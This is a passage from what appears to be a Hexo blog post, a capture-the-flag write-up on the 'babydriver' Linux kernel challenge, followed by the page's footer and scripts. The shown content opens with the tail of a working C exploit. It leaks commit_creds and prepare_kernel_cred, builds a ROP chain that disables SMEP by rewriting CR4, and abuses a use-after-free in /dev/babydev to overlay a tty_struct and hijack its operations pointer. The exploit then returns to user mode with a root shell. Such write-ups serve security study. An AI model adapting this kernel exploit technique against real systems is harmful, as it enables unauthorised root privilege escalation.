class="line">    errorMsg(<span class="string">&quot;fail to find symbols&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilege</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_func)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    <span class="type">void</span>* (*prepare_kernel_cred_func)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    (*commit_creds_func)((*prepare_kernel_cred_func)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> iretq_ret = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rax_ret = <span class="number">0xffffffff8100ce6e</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff810d238d</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_pop_rbp_ret = <span class="number">0xffffffff81063694</span>;</span><br><span class="line"><span class="type">size_t</span> mov_cr4_rdi_pop_rbp_ret = <span class="number">0xffffffff81004d80</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rsp_rax_dec_ebx_ret = <span class="number">0xffffffff8181bfc5</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="comment">// step1: leak commit_kernel</span></span><br><span class="line">    find_symbols();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step2: rop</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> ROP[<span class="number">0x20</span>];</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    ROP[i++] = mov_cr4_rdi_pop_rbp_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = getRootPrivilege;</span><br><span class="line">    ROP[i++] = swapgs_pop_rbp_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = iretq_ret;</span><br><span class="line">    ROP[i++] = spawn_shell;</span><br><span class="line">    ROP[i++] = user_cs;</span><br><span class="line">    ROP[i++] = user_rflags;</span><br><span class="line">    ROP[i++] = user_sp;</span><br><span class="line">    ROP[i++] = user_ss;</span><br><span class="line">    printAddr(<span class="string">&quot;ROP&quot;</span>,ROP);   </span><br><span class="line">    <span class="type">size_t</span> fake_op[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fake_op[i] = mov_rsp_rax_dec_ebx_ret;</span><br><span class="line">    &#125;</span><br><span class="line">    fake_op[<span class="number">0</span>] = pop_rax_ret;</span><br><span class="line">    fake_op[<span class="number">1</span>] = ROP;</span><br><span class="line">    printAddr(<span class="string">&quot;fake_op&quot;</span>,fake_op);</span><br><span class="line">    <span class="comment">// step3: UAF</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">size_t</span> fake_tty_array[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);   <span class="comment">//2(read/write)</span></span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd1 &lt; <span class="number">0</span> || fd2 &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errorMsg(<span class="string">&quot;fail to open babydriver&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x2e0</span>);           <span class="comment">//0x2e0 == sizeof(tty_struct)</span></span><br><span class="line">    close(fd1);                         <span class="comment">//UAF: fd2 still has pointer of babydev_struct</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>,<span class="number">2</span>);      <span class="comment">//get object(just freed baby_struct) from slab</span></span><br><span class="line">    <span class="keyword">if</span>(fd3 &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errorMsg(<span class="string">&quot;fail to open ptmx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    read(fd2,fake_tty_array,<span class="number">0x100</span>);</span><br><span class="line">    fake_tty_array[<span class="number">3</span>] = fake_op;</span><br><span class="line">    write(fd2,fake_tty_array,<span class="number">0x100</span>);</span><br><span class="line">    write(fd3,buf,<span class="number">0x8</span>);               <span class="comment">//hijack tty_operations pointer ==&gt; write</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+        </div>
+
+        
+            <div class="post-copyright-info my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> UAF &amp; babydriver</li>
+        <li><strong>Author:</strong> henry</li>
+        <li><strong>Created at
+                :</strong> 2023-11-28 22:13:47</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-11-28 22:17:11
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://henrymartin262.github.io/2023/11/28/kernelHeap/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/kernel/">#kernel</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/ret2usr/">#ret2usr</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/UAF/">#UAF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/tty-struct/">#tty_struct</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/smep-bypass/">#smep_bypass</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/11/24/ret2dir/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">ret2dir &amp; physmap spray</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail']
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">UAF &amp; babydriver</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#UAF-ret2usr"><span class="nav-text">UAF &amp; ret2usr</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#babydriver"><span class="nav-text">babydriver</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%9D%E6%8A%A4"><span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="nav-text">漏洞点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-text">静态分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">利用过程</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">henry</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.6</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
